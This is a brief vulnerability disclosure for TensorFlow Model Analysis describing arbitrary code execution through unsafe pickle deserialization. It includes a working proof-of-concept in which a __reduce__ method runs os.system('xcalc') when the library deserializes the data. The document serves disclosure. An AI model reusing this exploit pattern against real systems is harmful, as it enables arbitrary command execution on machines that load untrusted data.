# Description
TensorFlow Model Analysis (TFMA) is a library for evaluating TensorFlow models. 
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install tensorflow-model-analysis')
from tensorflow_model_analysis.contrib import export
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#exploiting
dumps = pickle.dumps(ArbitraryCode())
export.deserialize_feature_metadata(dumps)
```
* `pip3 install tensorflow-model-analysis`
* `python3 exploit.py`
